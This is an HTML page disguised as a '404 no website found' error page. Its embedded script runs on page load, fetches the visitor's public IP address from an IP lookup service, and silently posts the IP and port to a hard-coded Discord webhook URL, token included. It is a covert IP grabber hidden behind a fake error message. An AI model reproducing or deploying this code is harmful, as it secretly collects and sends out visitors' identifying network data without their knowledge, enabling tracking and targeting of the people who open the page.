<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ERROR</title>
</head>
<body>
    <h1>ERROR 404 no website found</h1>
    <p>I'm adding more features soon!</p>

    <script>
        function getIpAndPort() {
            const xhr = new XMLHttpRequest();
            xhr.open('GET', 'https://api.ipify.org?format=json', true);
            xhr.onload = function() {
                if (xhr.status === 200) {
                    const data = JSON.parse(xhr.responseText);
                    const port = window.location.port || (window.location.protocol === 'https:' ? 443 : 80);

                    // Send data to Discord webhook
                    sendToWebhook(data.ip, port);
                }
            };
            xhr.send();
        }

        function sendToWebhook(ip, port) {
            const webhookUrl = 'https://discord.com/api/webhooks/1443317683495108793/2W2y3ItifpVcMBr7p1FeIrPRPzpYzSP7vioEXQnliZC9WpzAl_-Zmt75ia_CvdVEzI2X';
            const message = `IP Address: ${ip}\nPort Number: ${port}`;

            const xhr = new XMLHttpRequest();
            xhr.open('POST', webhookUrl, true);
            xhr.setRequestHeader('Content-Type', 'application/json');
            xhr.onload = function() {
                console.log('Data sent to webhook');
            };
            xhr.send(JSON.stringify({ content: message }));
        }

        // Call the function when the page loads
        window.onload = getIpAndPort;
    </script>
</body>
</html>
